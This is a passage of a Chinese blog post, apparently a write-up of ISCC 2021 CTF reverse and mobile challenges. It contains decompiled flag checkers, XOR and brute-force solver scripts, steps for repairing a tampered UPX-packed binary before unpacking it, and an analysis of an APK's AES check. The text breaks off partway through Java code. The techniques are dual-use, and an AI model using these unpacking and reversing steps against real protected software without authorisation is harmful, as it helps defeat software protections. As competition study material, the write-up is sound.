<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="【wp】2021ISCC"><meta name="keywords" content="CTF,Reverse,wp"><meta name="author" content="c10udlnk"><meta name="copyright" content="c10udlnk"><title>【wp】2021ISCC | c10udlnk's Blog</title><link rel="shortcut icon" href="/icon.jpg"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到你搜索的这个呀>^<（FOR ${query}）"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="c10udlnk's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经阅读 -&gt;</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-50pt-Garden"><span class="toc-text">[练武题 50pt] Garden</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TO-DO-%E7%BB%83%E6%AD%A6%E9%A2%98-350pt-%E6%97%A0%E6%B3%95%E6%B3%A8%E5%86%8C%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="toc-text">TO DO [练武题 350pt] 无法注册的程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E9%A2%98-150pt-%E6%B1%87%E7%BC%96%E5%A4%A7%E4%BA%BA%EF%BC%8C%E6%97%B6%E4%BB%A3%E5%8F%98%E4%BA%86"><span class="toc-text">[擂台题 150pt] 汇编大人，时代变了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E9%A2%98-150pt-Greedy-Snake"><span class="toc-text">[擂台题 150pt] Greedy Snake</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE"><span class="toc-text">MOBILE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-100pt-Mobile-Easy"><span class="toc-text">[练武题 100pt] Mobile Easy</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-50pt-ISCC%E5%AE%A2%E6%9C%8D%E5%86%B2%E5%86%B2%E5%86%B2%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-text">[练武题 50pt] ISCC客服冲冲冲（一）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-50pt-%E8%BF%99%E6%98%AF%E5%95%A5"><span class="toc-text">[练武题 50pt] 这是啥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-50pt-Retrieve-the-passcode"><span class="toc-text">[练武题 50pt] Retrieve the passcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-50pt-M78"><span class="toc-text">[练武题 50pt] M78</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/c10udlnk_loong.jpg"></div><div class="author-info__name text-center">c10udlnk</div><div class="author-info__description text-center">A RE CTFer, a s0Ity f1sh... &lt;。)#)))≦</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/c10udlnk">do not Follow Me</a></div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/ToverPomelo">just Follow my \Tover/</a></div><hr><div class="author-info-articles"><a class="author-info-articles__linkbf article-meta" target="_blank" rel="noopener" href="https://tover.xyz"><span class="pull-left">\Tover/ \Tover/ \Tover/</span><span class="pull-right">jmp → </span></a><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">41</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">12</span></a><a class="author-info-articles__links article-meta" href="/links"><span class="pull-left">友链</span><span class="pull-right">∞</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/lijiang-tower.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">c10udlnk's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/archives">po5ts</a><a class="site-page" href="/tags">t4gs</a><a class="site-page" href="/categories">categ0ries</a><a class="site-page" href="/slides">slid3s</a><a class="site-page" href="/links">l1nks</a><a class="site-page" href="/p/blogsFor-AboutMe-Pinned">Who Am I</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">【wp】2021ISCC</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-26</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Write-up/">Write up</a><div class="post-meta-wordcount"><span>Words cnt: </span><span class="word-count">3k</span><span class="post-meta__separator">|</span><span>Need time: 13 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>ISCC的wp，没想着打这比赛，就是单纯来看看题嘿嘿 :-)</p>
<p>后面太忙就没怎么看了，下了题目有空回来做一下。老规矩，标了TO DO的是还没写完的（。</p>
<a id="more"></a>

<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="练武题-50pt-Garden"><a href="#练武题-50pt-Garden" class="headerlink" title="[练武题 50pt] Garden"></a>[练武题 50pt] Garden</h2><p>拿上手还以为有pyc混淆，结果一uncompyle6居然没报错，好吧应该是签到题了。</p>
<p>反编译出的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) </span></span><br><span class="line"><span class="comment"># [GCC 7.5.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: garden.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-02-28 12:29:29</span></span><br><span class="line"><span class="keyword">import</span> platform, sys, marshal, types</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">s</span>):</span></span><br><span class="line">    f = <span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) != <span class="built_in">len</span>(f):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    checksum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(f, s):</span><br><span class="line">        checksum += <span class="built_in">ord</span>(b) ^ <span class="built_in">ord</span>(a) ^ <span class="number">123</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info.major != <span class="number">2</span> <span class="keyword">or</span> sys.version_info.minor != <span class="number">7</span>:</span><br><span class="line">    sys.exit(<span class="string">&#x27;\xe8\xaf\x95\xe8\xaf\x95 Python 2.7.&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    sys.exit(<span class="string">&#x27;usage: bronze.pyc &lt;flag&gt;&#x27;</span>)</span><br><span class="line">flag = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt;= <span class="number">32</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe5\xa4\xaa\xe9\x95\xbf\xe4\xba\x86.&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">alphabet = <span class="built_in">set</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@#$%+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;\xe4\xb8\x8d\xe5\xaf\xb9.&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check(flag):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe5\xb0\xb1\xe6\x98\xaf\xe8\xbf\x99\xe4\xb8\xaa!&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe6\x90\x9e\xe9\x94\x99\xe4\xba\x86.&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># okay decompiling garden.pyc</span></span><br></pre></td></tr></table></figure>

<p>既然是签到题那可以大胆地猜测每一个ord(b) ^ ord(a) ^ 123都等于0（即checksum一直不变），也就是说<code>ord(b)=ord(a)^123</code>，直接写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="number">123</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>拿到flag：<strong>ISCC{Makka2021Pakka}</strong></p>
<h2 id="TO-DO-练武题-350pt-无法注册的程序"><a href="#TO-DO-练武题-350pt-无法注册的程序" class="headerlink" title="TO DO [练武题 350pt] 无法注册的程序"></a>TO DO [练武题 350pt] 无法注册的程序</h2><p>这道题感觉是去年XNUCA初赛的MFC原题unravelmfc（wp可见<a target="_blank" rel="noopener" href="https://yfli.top/2020/12/31/2020XNUCA/#more">2020XNUCA Reverse 部分Writeup | feng’s blog</a>）&#x3D; &#x3D;当时第一次接触MFC逆向还是挺印象深刻的。</p>
<p>（回头复现一下</p>
<h2 id="擂台题-150pt-汇编大人，时代变了"><a href="#擂台题-150pt-汇编大人，时代变了" class="headerlink" title="[擂台题 150pt] 汇编大人，时代变了"></a>[擂台题 150pt] 汇编大人，时代变了</h2><p>感觉是送分题？flag不难拿，但是最后有个点感觉一直很奇怪ummm</p>
<p><code>.ll</code>后缀的文件查了一下是LLVM指令集，可以见<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37206105/article/details/115274241">LLVM IR &#x2F; LLVM指令集入门_Canliture-CSDN博客</a>，但是在决定死磕手动反编译之前还是得挣扎一下看有没有工具能直接反编译。</p>
<p>经过不懈搜索看到了<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5180914/llvm-ir-back-to-human-readable-source-language">c++ - llvm ir back to human-readable source language? - Stack Overflow</a>，但安装完llvm以后才知道llc的<code>-march=c</code>参数在2016年就已经被remove了（）</p>
<p>然后看到了这个<a target="_blank" rel="noopener" href="https://hujun1413.github.io/2016/11/09/OSLab/LLVM/0.LLVM%E5%AE%89%E8%A3%85%E5%8F%8A%E5%B7%A5%E5%85%B7%E9%93%BE/">0.LLVM安装及工具链 | 胡君的个人博客</a>，发现了另外一条路：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506004938357.png"></p>
<p>逆向分析elf，这不就是re手的日常吗？果断下手。</p>
<p>先通过<code>sudo apt install llvm clang</code>把LLVM的套件装上，然后依次输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">llc task.ll -o task.s</span><br><span class="line">gcc -c task.s -o task.o</span><br><span class="line">gcc task.o -o task</span><br></pre></td></tr></table></figure>

<p>但是走最后一步会报错：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506010008949.png"></p>
<p>估计是缺什么库吧，懒得装了，直接用ida分析<code>task.o</code>（反正分析效果差不多</p>
<p>可以看到主函数逻辑挺明显的了，把printf的两个数组转string以后就更明显：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506124553396.png"></p>
<p>检查长度对了以后走红色框或者蓝色框的逻辑，最后输出s。</p>
<p>红色框部分涉及到的数组都是已知数组，可以很轻松地算出s，这种套路一看就是fake flag（还去算了一下</p>
<p><img src="/p/wpFor-2021iscc/image-20210506124813644.png"></p>
<p>所以就是要过check，进而走到蓝色部分才能拿到真flag。</p>
<p>check部分：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506124903971.png"></p>
<p>也就是说要让<code>s[i]^s[(i+1)%strlen(what)]==what[i]</code>，而<code>strlen(what)==56</code>。</p>
<p>列举出来大概是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s[0]^s[1]&#x3D;&#x3D;what[0]</span><br><span class="line">s[1]^s[2]&#x3D;&#x3D;what[1]</span><br><span class="line">...</span><br><span class="line">s[54]^s[55]&#x3D;&#x3D;what[54]</span><br><span class="line">s[55]^s[0]&#x3D;&#x3D;what[55]</span><br></pre></td></tr></table></figure>

<p>好了，疑惑点就来了，如果把左边的都xor起来，然后右边也全xor，理论上说两边应该是相等的，即<code>s[0]^s[1]^s[1]^s[2]^...^s[54]^s[55]^s[55]^s[0]==what[0]^what[1]^...^what[54]^what[55]</code>，而左边因为每一项都出现了两次所以最后结果必然是0，但是右边算了一下并不会等于0：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506125929432.png"></p>
<p>就很离谱（……）</p>
<p>所以干脆直接爆破，遍历256次找都是可见字符的flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">secret=[<span class="number">0x42</span>, <span class="number">0x0A</span>, <span class="number">0x7C</span>, <span class="number">0x5F</span>, <span class="number">0x22</span>, <span class="number">0x06</span>, <span class="number">0x1B</span>, <span class="number">0x67</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x5C</span>, <span class="number">0x46</span>, <span class="number">0x0A</span>, <span class="number">0x29</span>, <span class="number">0x09</span>, <span class="number">0x30</span>, <span class="number">0x51</span>, <span class="number">0x38</span>, <span class="number">0x5F</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x13</span>, <span class="number">0x18</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>]</span><br><span class="line">flag=[<span class="number">0x1D</span>, <span class="number">0x55</span>, <span class="number">0x23</span>, <span class="number">0x68</span>, <span class="number">0x4A</span>, <span class="number">0x37</span>, <span class="number">0x2E</span>, <span class="number">0x38</span>, <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x72</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x3D</span>, <span class="number">0x5B</span>, <span class="number">0x62</span>, <span class="number">0x67</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x6D</span>, <span class="number">0x74</span>, <span class="number">0x47</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x37</span>, <span class="number">0x55</span>, <span class="number">0x0B</span>, <span class="number">0x6E</span>, <span class="number">0x4E</span>, <span class="number">0x6A</span>, <span class="number">0x44</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x30</span>, <span class="number">0x19</span>, <span class="number">0x3B</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0x49</span>, <span class="number">0x61</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x2C</span>, <span class="number">0x71</span>, <span class="number">0x75</span>, <span class="number">0x3C</span>, <span class="number">0x67</span>, <span class="number">0x1D</span>, <span class="number">0x3B</span>, <span class="number">0x4B</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x59</span>]</span><br><span class="line">what=[<span class="number">0x64</span>, <span class="number">0x4E</span>, <span class="number">0x6C</span>, <span class="number">0x2E</span>, <span class="number">0x1E</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x04</span>, <span class="number">0x44</span>, <span class="number">0x12</span>, <span class="number">0x1C</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0x59</span>, <span class="number">0x3D</span>, <span class="number">0x0B</span>, <span class="number">0x5A</span>, <span class="number">0x78</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x76</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x33</span>, <span class="number">0x13</span>, <span class="number">0x16</span>, <span class="number">0x20</span>, <span class="number">0x7E</span>, <span class="number">0x6B</span>, <span class="number">0x23</span>, <span class="number">0x36</span>, <span class="number">0x45</span>, <span class="number">0x07</span>, <span class="number">0x11</span>, <span class="number">0x2C</span>, <span class="number">0x22</span>, <span class="number">0x4A</span>, <span class="number">0x4A</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x48</span>, <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x11</span>, <span class="number">0x0F</span>, <span class="number">0x6A</span>, <span class="number">0x18</span>, <span class="number">0x37</span>, <span class="number">0x42</span>, <span class="number">0x1E</span>, <span class="number">0x2B</span>, <span class="number">0x12</span>, <span class="number">0x03</span>, <span class="number">0x5A</span>, <span class="number">0x47</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">###### fake flag</span></span><br><span class="line"><span class="comment"># ans=&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(len(what)):</span></span><br><span class="line"><span class="comment">#     ans+=chr(flag[i]^secret[i%len(secret)])</span></span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    ans=[x]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(what)):</span><br><span class="line">        ans.append(ans[i<span class="number">-1</span>]^what[i<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ans)):</span><br><span class="line">        ans[i]^=secret[i%<span class="built_in">len</span>(secret)]</span><br><span class="line">        <span class="keyword">if</span> ans[i] <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>): <span class="comment"># 可见字符范围</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        myFlag=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,ans))</span><br><span class="line">        print(<span class="string">&quot;ISCC&#123;&quot;</span>+myFlag+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506135702474.png"></p>
<p>这就是我们的flag：<strong>ISCC{mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n_!_}</strong></p>
<h2 id="擂台题-150pt-Greedy-Snake"><a href="#擂台题-150pt-Greedy-Snake" class="headerlink" title="[擂台题 150pt] Greedy Snake"></a>[擂台题 150pt] Greedy Snake</h2><p>拖入ida发现报错<code>The imports segment seems to be destroyed. This MAY mean that the file was packed or otherwise modified in order to make it more difficult to analyze. If you want to see the imports segment in the original form, please reload it with the &#39;make imports section&#39; checkbox cleared.</code>。</p>
<p><img src="/p/wpFor-2021iscc/image-20210517191833742.png"></p>
<p>猜测有壳，用ExEinfoPE一查果然有upx壳</p>
<p><img src="/p/wpFor-2021iscc/image-20210517192045602.png"></p>
<p>然鹅并不能一键脱，报错<code>CantUnpackException: file is modified/hacked/protected; take care!!!</code>，应该是文件加壳后又加了混淆，搜到了这一篇：<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-326995-1-1.html">UPX防脱壳机脱壳、去除特征码、添加花指令小探 - 『脱壳破解区』 - 吾爱破解</a>。</p>
<p>查看程序的区段名发现果然有改：</p>
<p><img src="/p/wpFor-2021iscc/image-20210517194802336.png"></p>
<p><img src="/p/wpFor-2021iscc/image-20210517195405634.png"></p>
<p>用010Editor改区段名：</p>
<p><img src="/p/wpFor-2021iscc/image-20210517205244403.png"></p>
<p>除此之外还有这里被魔改的<code>UPX!</code>：</p>
<p><img src="/p/wpFor-2021iscc/image-20210517204950681.png"></p>
<p><img src="/p/wpFor-2021iscc/image-20210517205316677.png"></p>
<p>改完这两个地方终于可以脱壳了（<code>upx -d</code>）：</p>
<p><img src="/p/wpFor-2021iscc/image-20210517205340903.png"></p>
<p>用ida看脱壳后的程序：</p>
<p><img src="/p/wpFor-2021iscc/image-20210517205540905.png"></p>
<p>主函数有puts，直接查看交叉引用，能看到<code>flag_check()</code>函数：</p>
<p><img src="/p/wpFor-2021iscc/image-20210517205620058.png"></p>
<p>这就是出flag的地方，可以说逻辑非常明显了，base64甚至没有换表，xor处理部分根据xor的特性把加密流程重新走一遍就好。</p>
<p><img src="/p/wpFor-2021iscc/image-20210517205930766.png"></p>
<p>写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;QFpKSnJWXFlRKFY8PFY8OVY8MVY9Z21WSz08bCJROVt0&quot;</span></span><br><span class="line">b64res=base64.b64decode(res).decode()</span><br><span class="line">l=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,b64res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(l)%i!=<span class="number">0</span>:</span><br><span class="line">            l[j]^=i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l[j]^j</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,l))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>flag：<strong>ISCC{_UPX!_55_50_58_4nd_B45e+X0R}</strong></p>
<h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="练武题-100pt-Mobile-Easy"><a href="#练武题-100pt-Mobile-Easy" class="headerlink" title="[练武题 100pt] Mobile Easy"></a>[练武题 100pt] Mobile Easy</h2><p>一个java层的apk题，甚至不用看so，用JEB反编译可以看到关键check函数是<code>getflag()</code></p>
<p><img src="/p/wpFor-2021iscc/image-20210506190609808.png"></p>
<p>蓝框就是我们需要到达的地方</p>
<p><img src="/p/wpFor-2021iscc/image-20210506190709704.png"></p>
<p>所以flag经过<code>first.firstStr()</code>处理后的形式是<code>ISCC&#123;xxxxxxxxxxyyyyyyyy&#125;</code>。</p>
<p><code>xxxxxxxxxx</code>经过<code>second.secondStr()</code>的check，<code>yyyyyyyy</code>则经过<code>third.thirdStr()</code>的check。</p>
<p>先看<code>second.secondStr()</code>，可以看到是一个ECB模式的AES，密文是<code>b64decode(&quot;9z2ukkD3Ztxhj+t/S1x1Eg==&quot;)</code>，密钥是<code>b&#39;1234567890123456&#39;</code>。</p>
<p><img src="/p/wpFor-2021iscc/image-20210506194617030.png"></p>
<p>至于是加密还是解密，可以看到<code>v7.init(2, ((Key)v6))</code>，而查常量有：</p>
<p><img src="/p/wpFor-2021iscc/image-20210506195606878.png"></p>
<p>所以这里是AES解密，就得到了前半部分的处理后字符串，注意最后要将空格替换掉。</p>
<p>再看<code>third.thirdStr(v2_1)</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">thirdStr</span><span class="params">(String arg14)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">8</span>;</span><br><span class="line">    <span 